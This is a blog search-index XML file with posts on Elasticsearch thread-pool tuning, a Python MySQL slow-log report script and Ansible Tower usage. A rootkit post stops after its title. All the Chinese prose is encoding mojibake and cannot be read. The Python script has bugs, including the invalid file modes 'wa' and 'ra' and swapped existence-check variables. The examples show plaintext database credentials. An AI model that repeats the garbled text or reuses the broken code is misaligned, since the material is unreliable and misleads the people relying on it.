<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ElasticSearch Êõ¥ÊîπsearchÁ∫øÁ®ãÊ±†]]></title>
    <url>%2F2019%2F01%2F22%2Ferrornote-elk%2F</url>
    <content type="text"><![CDATA[elasticsearch &gt; 5.0 Êõ¥Êîπthread pool 0x00 Êä•ÈîôesÂ¥©Ê∫ÉÊü•ÁúãÊó•ÂøóÔºåÁî±‰∫ésearch Á∫øÁ®ãËÆæÁΩÆËøáÂ∞èÂØºËá¥Á®ãÂ∫èÂ¥©Ê∫ÉÔºåÈªòËÆ§searchÁ∫øÁ®ãÂ§ßÂ∞è‰∏∫((cpu‰∏™Êï∞ * 3) / 2) + 1 error_logCaused by: org.elasticsearch.common.util.concurrent.EsRejectedExecutionException: rejected execution of org.elasticsearch.search.SearchService$3@4d6f25c2 on EsThreadPoolExecutor [search, queue capacity = 1000, org.elasticsearch.common.util.concurrent.EsThreadPoolExecutor@24522e89 [Running, pool size = 13, active threads = 13, queued tasks = 52728, completed tasks = 314227215]] 1. Êü•ÁúãÁ∫øÁ®ãÁä∂ÊÄÅGET /_cat/thread_poolV3IzzeC bulk 0 0 0V3IzzeC fetch_shard_started 0 0 0V3IzzeC fetch_shard_store 0 0 0V3IzzeC flush 0 0 0V3IzzeC force_merge 0 0 0V3IzzeC generic 2 0 0V3IzzeC get 0 0 0V3IzzeC index 0 0 0V3IzzeC listener 0 0 0V3IzzeC management 3 0 0V3IzzeC refresh 0 0 0V3IzzeC search 13 0 1272V3IzzeC snapshot 0 0 0V3IzzeC warmer 0 0 0#‰πüÂèØÁî®Ê≠§apiÊü•ËØ¢GET /_cat/thread_pool/search?v&amp;h=id,name,active,queue,rejected,completed Á¨¨‰∏ÄÂàó V3IzzeCËäÇÁÇπÂêçÁß∞ Á¨¨‰∫åÂàó Á∫øÁ®ãÊ±†ÂêçÁß∞ Á¨¨‰∏âÂàó Á∫øÁ®ãÊ¥ªÂä® Á¨¨ÂõõÂàó Á∫øÁ®ãÈòüÂàó Á¨¨‰∫îÂàó Á∫øÁ®ãÊãíÁªù 2. Êü•ÁúãÁ∫øÁ®ãÁä∂ÊÄÅGET /_nodes/thread_pool/ "search": &#123; "type": "scanling", "min": 0, "max": 13, "queue_size": 13 &#125;, 0x01 Ëß£ÂÜ≥ ‰ªéElasticSearch5.0 ÂºÄÂßãÔºåÊó†Ê≥ïÈÄöËøáapiÊõ¥ÊîπÁ∫øÁ®ãÊ±†ÔºåÈúÄË¶ÅÊõ¥Êîπelasticsearch.ymlÂπ∂ÈáçÂêØÊâçËÉΩÁîüÊïàÈÖçÁΩÆ Êõ¥ÊîπÈÖçÁΩÆÊñá‰ª∂elasticsearch.ymlÂ¢ûÂä†Â¶Ç‰∏ãÂÜÖÂÆπ elasticsearch.yml1234567891011121314151617thread_pool.search.queue_size: 500#queue_sizeÂÖÅËÆ∏ÊéßÂà∂Ê≤°ÊúâÁ∫øÁ®ãÊâßË°åÂÆÉ‰ª¨ÁöÑÊåÇËµ∑ËØ∑Ê±ÇÈòüÂàóÁöÑÂàùÂßãÂ§ßÂ∞è„ÄÇthread_pool.search.size: 200#sizeÂèÇÊï∞ÊéßÂà∂Á∫øÁ®ãÊï∞ÔºåÈªòËÆ§‰∏∫Ê†∏ÂøÉÊï∞‰πò‰ª•5„ÄÇthread_pool.search.min_queue_size:10#min_queue_sizeËÆæÁΩÆÊéßÂà∂queue_sizeÂèØ‰ª•Ë∞ÉÊï¥Âà∞ÁöÑÊúÄÂ∞èÈáè„ÄÇthread_pool.search.max_queue_size: 1000#max_queue_sizeËÆæÁΩÆÊéßÂà∂queue_sizeÂèØ‰ª•Ë∞ÉÊï¥Âà∞ÁöÑÊúÄÂ§ßÈáè„ÄÇthread_pool.search.auto_queue_frame_size: 2000#auto_queue_frame_sizeËÆæÁΩÆÊéßÂà∂Âú®Ë∞ÉÊï¥ÈòüÂàó‰πãÂâçËøõË°åÊµãÈáèÁöÑÊìç‰ΩúÊï∞„ÄÇÂÆÉÂ∫îËØ•Ë∂≥Â§üÂ§ßÔºå‰ª•‰æøÂçï‰∏™Êìç‰Ωú‰∏ç‰ºöËøáÂ∫¶ÂÅèÂêëËÆ°ÁÆó„ÄÇthread_pool.search.target_response_time: 6s#target_response_timeÊòØÊó∂Èó¥ÂÄºËÆæÁΩÆÔºåÊåáÁ§∫Á∫øÁ®ãÊ±†ÈòüÂàó‰∏≠‰ªªÂä°ÁöÑÁõÆÊ†áÂπ≥ÂùáÂìçÂ∫îÊó∂Èó¥„ÄÇÂ¶ÇÊûú‰ªªÂä°ÈÄöÂ∏∏Ë∂ÖËøáÊ≠§Êó∂Èó¥ÔºåÂàôÂ∞ÜË∞É‰ΩéÁ∫øÁ®ãÊ±†ÈòüÂàó‰ª•ÊãíÁªù‰ªªÂä°„ÄÇ ÈáçÂêØesÔºåÈáçÊñ∞Êü•ÁúãÁ∫øÁ®ã‰ø°ÊÅØ GET /_nodes/thread_pool/ "search": &#123; "type": "fixed_auto_queue_size", "min": 200, "max": 200, "queue_size": 500 &#125;, 0x02 Refer https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-threadpool.htmlhttps://www.elastic.co/guide/en/elasticsearch/reference/current/cat-thread-pool.html]]></content>
      <categories>
        <category>ErrotNote</category>
        <category>ELK</category>
      </categories>
      <tags>
        <tag>ELK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python ÂàÜÊûêÊÖ¢Êü•ËØ¢Êó•ÂøóÁîüÊàêÊä•Âëä]]></title>
    <url>%2F2018%2F11%2F22%2Fmysql-slowlog-report%2F</url>
    <content type="text"><![CDATA[pythonÂàÜÊûêMysqlÊÖ¢Êü•ËØ¢„ÄÇÈÄöËøáPythonË∞ÉÁî®ÂºÄÊ∫êÂàÜÊûêÂ∑•ÂÖ∑pt-query-digestÁîüÊàêjsonÁªìÊûúÔºåPythonËÑöÊú¨Ëß£ÊûêjsonÁîüÊàêhtmlÊä•Âëä„ÄÇ 0x00 Áõ¥Êé•‰∏ä‰ª£Á†ÅÈ°πÁõÆÂú∞ÂùÄ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#!/usr/bin/env python# -*- coding: utf-8 -*-# @Time : 2018/10/12 ‰∏ãÂçà3:00# @Author : Kionf# @Site : https://kionf.com# @Software: Sublimeimport subprocessimport jsonimport osimport reimport sysimport timefrom jinja2 import Environment, FileSystemLoader# reload(sys)# sys.setdefaultencoding('utf-8')LibToolkit = 'pt-query-digest'LibToolkit_url = 'https://github.com/kalivim/Mysql-SlowLog-analysis/raw/master/pt-query-digest'HtmlTemplate = 'template.html'HtmlTemplate_url = 'https://github.com/kalivim/Mysql-SlowLog-analysis/raw/master/template.html'#Ê£ÄÊµãÊûÅËµños.system('rpm -q perl-Digest-MD5 || yum -y -q install perl-Digest-MD5')class RunAndCheckCommand: def __init__(self, commands, task_name, ret_code=0): self.commands = commands self.task_name = task_name self.ret_code = ret_code def check_command_status_code(self): """ Ê£ÄÊµã‰ªªÂä° """ if self.exp_code == self.ret_code: print("\033[92m [INFO]&gt;&gt; %s \033[0m" % self.task_name) else: print("\033[91m [ERROR]&gt;&gt; %s \033[0m" % self.task_name) exit(1) def exec_command_stdout_res(self): """ ÊâßË°åÂëΩ‰ª§ÂÆûÊó∂ËøîÂõûÂëΩ‰ª§ËæìÂá∫ :return: """ command_res = subprocess.Popen(self.commands, shell=True) while command_res.poll(): line = command_res.stdout.readline() line.strip() if line: print(line) command_res.wait() self.exp_code = command_res.returncode self.check_command_status_code()class AnalysisMysqlSlowLog: """ ÂàÜÊûêMysqlÊÖ¢Êü•ËØ¢Êó•ÂøóËæìÂá∫Êä•Âëä„ÄÇ Ë∞ÉÁî®Á¨¨‰∏âÊñπÂ∑•ÂÖ∑ÂåÖpercona-toolkit‰∏≠pt-query-digestÂ∑•ÂÖ∑ÔºåÈªòËÆ§ËæìÂá∫slow.jsonÊñá‰ª∂PerlËØ≠Ë®ÄÁºñÂÜô """ def __init__(self, slow_log_file, json_file, report_file): """ :param slow_log_file: ÈúÄË¶ÅÂàÜÊûêÁöÑÊÖ¢Êü•ËØ¢Êó•ÂøóÊñá‰ª∂ :param report_file: ÁîüÊàêÊä•ÂëäÊñá‰ª∂Âêç """ self.LibToolkit = LibToolkit self.json_file = json_file self.report_file = report_file self.slow_log_file = slow_log_file self.query_digest = "perl %s %s --output json --progress time,1 &gt; %s" % ( self.LibToolkit, slow_log_file, self.json_file) def check_argv_options(self): get_toolkit = os.path.isfile(HtmlTemplate) get_template = os.path.isfile(LibToolkit) get_slow_log = os.path.isfile(self.slow_log_file) if not get_toolkit: res = RunAndCheckCommand('wget %s 2&gt;/dev/null' % LibToolkit_url, '‰∏ãËΩΩpt-query-digestÂ∑•ÂÖ∑') res.exec_command_stdout_res() if not get_template: res = RunAndCheckCommand('wget %s 2&gt;/dev/null' % HtmlTemplate_url, '‰∏ãËΩΩÊä•ÂëäHTMLÊ®°Êùø') res.exec_command_stdout_res() if not get_slow_log: print("\033[91m [ERROR]&gt;&gt; ÊåáÂÆö %s ÊÖ¢Êü•ËØ¢Êó•Âøó‰∏çÂ≠òÂú® \033[0m" % self.slow_log_file) exit(1) def general_html_report(self, sql_info): env = Environment(loader=FileSystemLoader(os.path.dirname(__file__))) template = env.get_template(HtmlTemplate) html_content = template.render(sql_info=sql_info) with open(self.report_file, 'wa') as f: f.write(html_content.encode('utf-8')) def general_json_slow_log_report(self): """ Ë∞ÉÁî®Á¨¨‰∏âÊñπÂ∑•ÂÖ∑pt-query-digestÁîüÊàêjsonÊä•Âëä,Âπ∂Ëé∑ÂèñÈúÄË¶Å‰ø°ÊÅØ :return: digest slow_log format to json """ self.check_argv_options() RunCommandsOBJ = RunAndCheckCommand(self.query_digest, 'ÁîüÊàêJsonÊä•Âëä') RunCommandsOBJ.exec_command_stdout_res() f = open(self.json_file, 'ra') format_dict_all_data = json.load(f) have_slow_query_tables = [] all_sql_info = [] all_slow_query_sql_info = format_dict_all_data['classes'] global_sql_info = format_dict_all_data['global'] for slow_query_sql in all_slow_query_sql_info: query_metrics = slow_query_sql['metrics'] query_time = query_metrics['Query_time'] query_tables = slow_query_sql['tables'] for show_tables_sql in query_tables: get_table_name = show_tables_sql['create'].split('.')[1] table_name = re.match(r'`(\w*)`\\G', get_table_name).group(1) if table_name not in have_slow_query_tables: have_slow_query_tables.append(table_name) sql_info = &#123; 'ID': slow_query_sql['checksum'], 'query_time_max': query_time['max'], 'query_time_min': query_time['min'], 'query_time_95': query_time['pct_95'], 'query_time_median': query_time['median'], 'query_row_send_95': query_metrics['Rows_sent']['pct_95'], 'query_db': query_metrics['db']['value'], 'slow_query_count': slow_query_sql['query_count'], 'slow_query_tables': have_slow_query_tables, 'sql': slow_query_sql['example']['query'], &#125; all_sql_info.append(sql_info) all_sql_info = sorted(all_sql_info, key=lambda e: float(e['query_time_95']), reverse=True) return all_sql_infoclass SendReportForEmail: passdef help_msg(): """ ËæìÂá∫Â∏ÆÂä©‰ø°ÊÅØ """ msg = """ Usage: ./ slow-query-analysis.py ÊÖ¢Êü•ËØ¢Êó•Âøó ÁîüÊàêjsonÊä•ÂëäÊñá‰ª∂Âêç ÁîüÊàêhtmlÊä•ÂëäÊñá‰ª∂Âêç """ print(msg)if __name__ == "__main__": if len(sys.argv) == 4: slow_log_name = sys.argv[1] json_file_name = sys.argv[2] report_name = sys.argv[3] print('\033[92m ====ÂºÄÂßãÂàÜÊûêÊÖ¢Êü•ËØ¢Êó•Âøó==== \033[0m') obj = AnalysisMysqlSlowLog(slow_log_file=slow_log_name, json_file=json_file_name, report_file=report_name) res_json_report = obj.general_json_slow_log_report() obj.general_html_report(res_json_report) else: help_msg() 0x01 ËÑöÊú¨‰ΩøÁî®ÊñπÊ≥ïwget https://raw.githubusercontent.com/kalivim/Mysql-SlowLog-analysis/master/analysis-slow-log.pychmod +x analysis-slow-log.py./analysis-slow-log.py Mysql_SlowLog_file general_json_filename report_name ÂèÇÊï∞‰ªãÁªç Mysql_SlowLog_file mysqlÊÖ¢Êü•ËØ¢Êó•ÂøóÁöÑÊñá‰ª∂Âêçgeneral_json_filename ËÑöÊú¨ÁîüÊàêÁöÑjsonÊä•ÂëäÊñá‰ª∂Âêçreport_name ÁîüÊàêÁöÑHtmlÊä•ÂëäÂêç ÁîüÊàêÁªìÊûúÔºö 0x02 pt-query-digestÂ∑•ÂÖ∑‰ªãÁªçpt-query-digest‰∏∫perconaÂ∑•ÂÖ∑ÂåÖ‰∏≠ÁöÑ‰∏Ä‰∏™perlËÑöÊú¨ÔºåÁî®Êù•ÂàÜÊûêMysqlÊÖ¢Êü•ËØ¢Êó•ÂøóÔºåÊàñËÄÖtcpdumpÁöÑMysqlÁöÑÊï∞ÊçÆÂåÖ„ÄÇÁîüÊàêÁªìÊûúÊúâ‰∏âÁßçÊ†ºÂºèÂèØ‰ª•ÈÄâÊã©ÔºöjsonÔºåreport, Mysql Â∏∏Áî®ËØ≠Âè•Ôºö Â∞ÜÁªìÊûúÂíåÂéÜÂè≤ÂàÜÊûêËÆ∞ÂΩïÂÜôÂÖ•MysqlÊï∞ÊçÆÂ∫ìÔºà‰ºöËá™Âä®ÂàõÂª∫Ë°®ÔºåÈúÄÊåáÂÆöÂÜôÂÖ•Êï∞ÊçÆÂ∫ìÔºâ 1./pt-query-digest --progress time,1 --review h=172.16.8.185,D=kionf_dev,t=query_review,u=root,p=passwd --history h=172.16.8.185,D=kionf_dev,t=query_history,u=root,p=passwd mysql-M-slow.log ÁîüÊàêjsonÊä•Âëä ./pt-query-digest --progress time,1 --output json mysql-slow.log ÁîüÊàêreport ./pt-query-digest mysql-slow.log ÈÄâÈ°π‰ªãÁªçÔºö --progess time,1 ÊòæÁ§∫ÊÖ¢Êü•ËØ¢ÂàÜÊûêËøõÂ∫¶ÔºåÊØè1sÂà∑Êñ∞‰∏ÄÊ¨°--review Â∞ÜÂàÜÊûêÁªìÊûú‰øùÂ≠òÂà∞Ë°®‰∏≠ÔºåËøô‰∏™ÂàÜÊûêÂè™ÊòØÂØπÊü•ËØ¢Êù°‰ª∂ËøõË°åÂèÇÊï∞ÂåñÔºå‰∏Ä‰∏™Á±ªÂûãÁöÑÊü•ËØ¢‰∏ÄÊù°ËÆ∞ÂΩïÔºåÊØîËæÉÁÆÄÂçï„ÄÇ ‰∏ãÊ¨°‰ΩøÁî®--reviewÊó∂ÔºåÂ≠òÂú®Áõ∏ÂêåÁöÑËØ≠Âè•ÂàÜÊûêÔºå‰∏ç‰ºöËÆ∞ÂΩï„ÄÇ--history Â∞ÜÂàÜÊûêÁªìÊûú‰øùÂ≠òÂà∞Ë°®‰∏≠ÔºåÂàÜÊûêÁªìÊûúÊØîËæÉËØ¶ÁªÜÔºå ‰∏ãÊ¨°ÂÜç‰ΩøÁî®--historyÊó∂ÔºåÂ¶ÇÊûúÂ≠òÂú®Áõ∏ÂêåÁöÑËØ≠Âè•Ôºå‰∏îÊü•ËØ¢ÊâÄÂú®ÁöÑÊó∂Èó¥Âå∫Èó¥ÂíåÂéÜÂè≤Ë°®‰∏≠ÁöÑ‰∏çÂêåÔºåÂàô‰ºöËÆ∞ÂΩïÂà∞Êï∞ÊçÆË°®‰∏≠ --output ÂàÜÊûêÁªìÊûúËæìÂá∫Á±ªÂûã„ÄÇ json report json-anon]]></content>
      <categories>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ansible tower ÂÆûÊàò‰ΩøÁî®ËØ¶Ëß£]]></title>
    <url>%2F2018%2F11%2F21%2Ftower-useage%2F</url>
    <content type="text"><![CDATA[ansible tower 3.3.1 ÂÆûÊàò‰ΩøÁî®ÔºåÊ≠§ÊñáÊ°£‰∏∫ËøõÈò∂‰ΩøÁî®‰∏çÊòØÁΩë‰∏äÁÉÇÂ§ßË°óÁöÑÂÆâË£ÖÈÉ®ÁΩ≤ÔºåÂ¶ÇÈúÄÂÆâË£ÖÈÖçÁΩÆ‰ªãÁªçÁßªÊ≠•ansible-towerÂÆâË£ÖÂèäÁ†¥Ëß£ÂâçÂá†Âπ¥Â∞±‰∫ÜËß£ËøátowerÈÇ£Êó∂‰ΩøÁî®ÊÑüËßâ‰ªñÁöÑÁÇπÂ≠êÈ™öÔºå‰ΩÜ‰ΩøÁî®‰∏çÊòØÁâπÂà´Êñπ‰æø„ÄÇÁªèËøá3.0Â§ßÊîπÁâàÂêéÔºåÁî®ÁùÄÂæàËàíÂù¶ÔºÅÔºÅ 0x00 ‰ªãÁªçÂÖ≥‰∫éAnsible Tower ËøôÈáå‰∏çÂ§ö‰ªãÁªçÔºåÂ±û‰∫éÂèëÂ∏ÉÈÖçÁΩÆÁÆ°ÁêÜÁ≥ªÁªüÔºåÊîØÊåÅApiÂèäÁïåÈù¢Êìç‰ΩúÔºåDjangoÁºñÂÜô„ÄÇ‚òùÔ∏èÂ≠óÂ±å ÂÆûÈ™åÁéØÂ¢ÉCentOS Linux release 7.4.1708Ansible Tower 3.3.1‰∏ãËΩΩÂú∞ÂùÄÔºö https://releases.ansible.com/ansible-tower/setup/ÂèÇËÄÉÊñáÊ°£Ôºöhttps://docs.ansible.com/ansible-tower/latest/html/ ÂÖ≥‰∫éÊñ∞ÁâàÂØºËà™Ê†è‰ªãÁªç # viewesDashboard ‰ª™Ë°®ÁõòÂ±ïÁ§∫‰ø°ÊÅØÁöÑJobs Ë∑ëËøáÁöÑ‰ªªÂä°ËÆ∞ÂΩïSchedules ËÆ°Âàí‰ªªÂä°My View Êü•ÁúãÁî®Êà∑ÁöÑÂ∑•‰ΩúÊ®°ÁâàÔºåÂíå‰ªªÂä°ËÆ∞ÂΩï# resourcesTemplates ‰ªªÂä°Ê®°ÁâàÔºåÈÖçÁΩÆË∞ÉÁî®playbookÊâßË°åÊó∂ÁöÑÂêÑÁßçÂèÇÊï∞Ôºå‰ªéÊ≠§Â§ÑÊ∑ªÂä†ËÆ°Âàí‰ªªÂä°Credentials ÈÖçÁΩÆËøûÊé• Êú∫Âô®/‰∫ë‰∏ªÊú∫api Key/Ëá™ÂÆö‰πâÁöÑÂá≠ËØÅÁ±ªÂûã ÁöÑË¥¶Âè∑ÂØÜÁ†ÅÁ≠â‰ø°ÊÅØProjects ËøôÈáåÈÖçÁΩÆÈ°πÁõÆÂØπÂ∫îÁöÑplaybookÔºåÂèØ‰ª•‰ªéGit‰∏äÊãâÂèñÊàñ‰ªéÊú¨Âú∞Êñá‰ª∂Â§πËØªÂèñplaybookInventories ËµÑ‰∫ßÊ∏ÖÂçïInventory Scripts Ëá™ÂÆö‰πâËé∑ÂèñËµÑ‰∫ßÊ∏ÖÂçïÁöÑËÑöÊú¨# accessOrganizations ÁªÑÁªáÁÆ°ÁêÜUsers Áî®Êà∑ÁÆ°ÁêÜTeams Áî®Êà∑ÁªÑÁÆ°ÁêÜ# AdministrationCredential Types Ëá™ÂÆö‰πâÂá≠ËØÅÁ±ªÂûãÔºåÊ∑ªÂä†ÂêéÂèØÂú®Credentials‰∏≠‰ΩøÁî®Notifications ÈÖçÁΩÆ‰ªªÂä°ÈÄöÁü•ÔºåÊîØÊåÅÁîµÂ≠êÈÇÆ‰ª∂ÔºåTwillioÁîµËØùÁ≠âManagement Jobs ËÆ°Âàí‰ªªÂä°ÁÆ°ÁêÜInstance Groups ËµÑ‰∫ßÁªÑÁÆ°ÁêÜApplications Ëá™ÂÆö‰πâÂ∫îÁî®Settings ËÆæÁΩÆ ÂàùÂßãÊµÅÁ®ãÔºö‰ªéInventoriesÊ∑ªÂä†‰∏ªÊú∫ &gt; CredentialsÊ∑ªÂä†ËøûÊé•Êú∫Âô®ÂØÜÁ†Å/Ê∑ªÂä†gitË¥¶Âè∑ÔºàÁî®Êù•Projects‰ªéGitÊãâÂèñPlaybookÔºâ &gt; ProjectsÈÖçÁΩÆplaybookËé∑ÂèñÊñπÂºè &gt; TemplatesÊåáÂÆöÈÇ£‰∫õÊú∫Âô®Ë∑ëPlaybookÔºåÂíåËøêË°åÊó∂ÁöÑÂèÇÊï∞ 0x01 Â¶Ç‰ΩïÊâπÈáèÂØºÂÖ•ËµÑ‰∫ßÊñ∞ÁâàÊú¨ÁöÑansible-towerÈùûÂ∏∏Âº∫Â§ßÔºåÁ¨îËÄÖÁõ∏‰ø°‰ªñ‰∏ÄÂÆöËÉΩÁ´ôËµ∑Êù•„ÄÇÂÖ≥‰∫éËµÑ‰∫ßÁöÑÂØºÂÖ•ansible towerÂÜÖÈÉ®ÊîØÊåÅ‰ªé‰∫ëÂéÇÂïÜÊàñËÄÖÁßÅÊúâËôöÊãüÂåñ‰∫ëÁõ¥Êé•ÂØºÂÖ•Êú∫Âô®ÔºåÂ¶ÇÊûú‰Ω†‰ΩøÁî®ÁöÑ‰∫ëÂéÇÂïÜ‰∏çÊîØÊåÅÔºåËøòÂèØËá™Â∑±ÁºñÂÜôpython/shellËÑöÊú¨Êù•Ë∞ÉÁî®‰∫ëÂéÇÂïÜAPIÊ∑ªÂä†Âà∞ansible towerËµÑ‰∫ß‰∏≠„ÄÇÊäìÁ¥ß Let‚Äôs Go 1. ÈÄöËøáUIÁïåÈù¢ÂØºÂÖ•ÁÇπÂáªInventoriesÁÇπÂáªÊ∑ªÂä†ÊåâÈíÆÔºå‰ºöÊèêÁ§∫Âá∫‰∏§ÁßçInventoryÔºöInventory Ê≠£Â∏∏ÁöÑËµÑ‰∫ßÔºå Smart Inventory Ê†πÊçÆ‰ªéInventoryÁ≠õÈÄâÊù°‰ª∂ÂèòÂåñÁöÑ 1ÔºâÊ∑ªÂä†Inventory ‰øùÂ≠òÂêéÂú®ÁÇπÂáªHOSTSÊ∑ªÂä†‰∏ªÊú∫ 2ÔºâÊ∑ªÂä†Smart Inventory Smart Inventory ÊòØÈÄöËøáÁ≠õÈÄâIP/‰∏ªÊú∫ÂêçÁß∞/idËåÉÂõ¥ Êù•ÂÆö‰πâÁöÑ‰∏ªÊú∫Ê∏ÖÂçï 2. ÈÄöËøáÂëΩ‰ª§Ë°åtower-manageÊâπÈáèÊ∑ªÂä†‰∏ªÊú∫ÈÄöËøáTowerËá™Â∏¶ÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑tower-manageÊù•ÊâπÈáèÂØºÂÖ•‰∏ªÊú∫ÔºåÂèØ‰ª•‰ªé‰∏ªÊú∫ÁöÑ/etc/ansible/hosts‰∏≠Áõ¥Êé•ÂØºÂÖ• Á§∫‰æãÊñá‰ª∂[test:children]test-signaltest-mysqltest-rtctest-tomcat[test-rtc]172.16.8.193 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.189 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.187 ansible_ssh_port=52330 ansible_ssh_user=root[test-mysql]172.16.8.186 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.185 ansible_ssh_port=52330 ansible_ssh_user=root[test-signal]172.16.8.190 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.191 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.197 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.198 ansible_ssh_port=52330 ansible_ssh_user=root[test-tomcat]172.16.8.184 ansible_ssh_user=root172.16.8.188 ansible_ssh_user=root[test-nginx]172.16.8.191 ansible_ssh_port=52330 ansible_ssh_user=root172.16.8.190 ansible_ssh_port=52330 ansible_ssh_user=root ÂëΩ‰ª§ÂØºÂÖ•Âà∞ËµÑ‰∫ßÊ∏ÖÂçïtower-manage inventory_import --source=/etc/ansible/hosts --group-filter=test --inventory-name=ÊµãËØïÁéØÂ¢É --keep-vars 1.569 INFO Updating inventory 7: ÊµãËØïÁéØÂ¢É 1.674 INFO Reading Ansible inventory source: /etc/ansible/hosts 3.003 INFO Processing JSON output... 3.004 INFO Loaded 7 groups, 11 hosts 3.292 INFO Inventory import completed for (ÊµãËØïÁéØÂ¢É - 17) in 1.7s ÈÄâÈ°π‰ªãÁªçÔºö --source ÊåáÂÆöinventoryÊñá‰ª∂--group-filter ‰ªéÊñá‰ª∂‰∏≠ÈÄöËøáÁªÑÂêçËøáÊª§--host-filter ÈÄöËøáhost nameËøáÊª§--inventory-name ÂØºÂÖ•Âà∞ÊåáÂÆöÂêçÁß∞ËµÑ‰∫ßÊ∏ÖÂçï--inventory-id ÂØºÂÖ•Âà∞ÊåáÂÆöIDÁöÑËµÑ‰∫ßÊ∏ÖÂçï# name Âíå id ÈÄâ‰∏Ä‰∏™--overwrite Ë¶ÜÁõñ‰∏ªÊú∫ÂíåÁªÑÔºåÈªòËÆ§‰∏çË¶ÜÁõñ--overwrite-vars Ë¶ÜÁõñ‰∏ªÊú∫ÂèòÈáè--keep-vars ‰øùÊåÅ‰∏ªÊú∫ÂèòÈáè--enabled-value ÂØºÂÖ•ÁöÑ‰∏ªÊú∫Áä∂ÊÄÅÊòØÂê¶ÊøÄÊ¥ªÈªòËÆ§ÊøÄÊ¥ª ÂØºÂÖ•ÁªìÊûú 3. ÂØºÂÖ•‰∫ëÂéÇÂïÜ‰∏ªÊú∫ÊöÇÊú™‰ΩøÁî®üòÇ 0x02 ÂàõÂª∫Âá≠ËØÅÂèØ‰ª•ÂàõÂª∫ÂêÑÁßçÂêÑÊ†∑ÁöÑÂá≠ËØÅÔºåËøûÊé•‰∫ëÂéÇÂïÜApiÁöÑÂá≠ËØÅ/ËøûÊé•gitlabÁöÑÂá≠ËØÅ/ËøûÊé•Linux‰∏ªÊú∫ÁöÑÂá≠ËØÅ/Ëá™ÂÆö‰πâÁöÑÂá≠ËØÅÁ≠âÁ≠â„ÄÇ„ÄÇÊàë‰ª¨ÂÖàÂàõÂª∫‰∏Ä‰∏™GitlabËÆ§ËØÅÁî®Êù•ÊãâÂèñÊàë‰ª¨ÁöÑPlaybook 1. ÂàõÂª∫ÁâàÊú¨ÊéßÂà∂Âá≠ËØÅ Credential TypeÈÄâÊã©Source Control 2. ÂàõÂª∫ÁôªÈôÜÊú∫Âô®Âá≠ËØÅ Credential Type ÈÄâÊã© Machine 0x03 ÂàõÂª∫È°πÁõÆplaybookÊãâÂèñÁöÑÊñπÂºè‰∏ªË¶ÅÊúâÔºö - Manual ‰ªéÊú¨Âú∞ÁõÆÂΩïËØªÂèñ- Git ‰ªéGitÊãâÂèñ- Mercurial ‰ªémer- SVN- RedHatInsights ËøôÈáåÈÄâÁî®Git‰ªéGitlab‰∏äÊãâÂèñ OptionsÈÄâÈ°πÈÖçÁΩÆÔºö - Clean Âú®‰ªégitlabÊãâÂèñÂâçÊ∏ÖÈô§Êú¨Âú∞‰øÆÊîπÁöÑplaybook- Delete on Update ÂΩìÊõ¥Êñ∞Êó∂Âà†Èô§ÊâÄÊúâÊú¨Âú∞ÂÇ®Â≠òplaybook- Update Revision on Launch ÂΩìTemplates‰ªªÂä°ËøêË°åÊó∂ÔºåËá™Âä®‰ªégitÊãâÂèñÊõ¥Êñ∞ tower ÊµãËØïplaybookÂú∞ÂùÄÔºötower-example 0x04 ÂàõÂª∫‰ªªÂä°Ê®°ÊùøÊúÄÂêé‰∏ÄÊ≠•Êù•‰∫Ü,ÂàõÂª∫Templates OptionsÈÄâÈ°πÈÖçÁΩÆÔºö - Enable Privilege Escalation # ÈªòËÆ§ËÑöÊú¨‰ª•awxÁî®Êà∑ÊâßË°åplaybookÔºåÂºÄÂêØÂêé‰ΩøÁî®ÁÆ°ÁêÜÂëòË∫´‰ªΩ- Allow Provisioning Callbacks # ËøêË°åÈÄöËøáurlÂõûË∞ÉÊù•ÂêØÂä®Ëøô‰∏™‰ªªÂä°- Enable Concurrent Jobs # ÂÖÅËÆ∏Áõ∏Âêå‰ªªÂä°‰∏ÄËµ∑ËøêË°å- Use Fact Cache # ‰ΩøÁî®ÁºìÂ≠ò ÁÇπÂáªSCHEDULESÂèØ‰ª•Ê∑ªÂä†ËÆ°Âàí‰ªªÂä° 0x05 ÂÆåÁªì ÊàëÁõ∏‰ø°Tower‰ºöÁ´ôËµ∑Êù•üòÇÔºåÂêéÁª≠ÂÜçË°•ÂÖÖ„ÄÇ ÂèÇËÄÉÔºö https://docs.ansible.com/ansible-tower/latest/html/]]></content>
      <categories>
        <category>Ëá™Âä®ÂåñËøêÁª¥</category>
        <category>Ansible-Tower</category>
      </categories>
      <tags>
        <tag>Ansible-Tower</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinuxÂä®ÊÄÅÈìæÊé•Â∫ìÈ¢ÑÂä†ËΩΩÂûãÂêéÈó®ÔºåVlanyÂÆâË£ÖÂèäÂàÜÊûê]]></title>
    <url>%2F2018%2F10%2F25%2Frookit-vlany%2F</url>
